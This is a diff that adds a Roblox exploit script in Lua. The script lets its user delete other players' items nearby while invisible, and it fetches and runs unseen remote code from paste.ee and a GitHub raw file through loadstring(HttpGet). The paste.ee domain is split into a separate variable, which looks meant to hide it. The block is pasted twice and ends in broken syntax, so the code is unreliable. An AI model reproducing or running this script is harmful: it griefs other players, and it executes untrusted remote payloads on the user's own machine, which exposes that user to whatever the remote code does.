@@ -1,0 +1,34 @@
+--[[
+    script by Stan#8292
+]]
+getgenv().bind = "F" --keybind to delete popits near you
+getgenv().invis = false --turns you invis so people cant see you deleting their stuff (resetting will uninvis you)
+getgenv().on = true --setting this to false will stop the script
+getgenv().IgnoredList = { --ignored people (script won't delete popits from these people)
+    "Person1",
+    "Person2",
+    "Person3"
+}
+
+local domain = "paste.ee"
+loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+
+local Section = Tab:NewSection("Delete items")
+--[[
+    script by Stan#8292
+]]
+getgenv().bind = "F" --keybind to delete popits near you
+getgenv().invis = false --turns you invis so people cant see you deleting their stuff (resetting will uninvis you)
+getgenv().on = true --setting this to false will stop the script
+getgenv().IgnoredList = { --ignored people (script won't delete popits from these people)
+    "Person1",
+    "Person2",
+    "Person3"
+}
+ 
+local domain = "paste.ee"
+loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()end)
